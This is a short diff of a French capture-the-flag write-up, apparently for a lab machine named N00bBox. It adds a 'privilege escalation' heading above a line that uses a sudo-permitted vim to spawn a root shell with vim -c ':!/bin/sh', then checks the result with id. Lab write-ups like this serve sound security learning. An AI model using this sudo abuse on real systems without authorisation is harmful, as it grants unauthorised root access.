@@ -127,6 +127,8 @@ User noobbox may run the following commands on N00bBox:
     (ALL : ALL) /usr/bin/vim
 ```
 
+## Escalade de privilèges
+
 Je deviens `root` avec la commande suivante : `vim -c ':!/bin/sh'`
 
 Pour vérifier : `id`
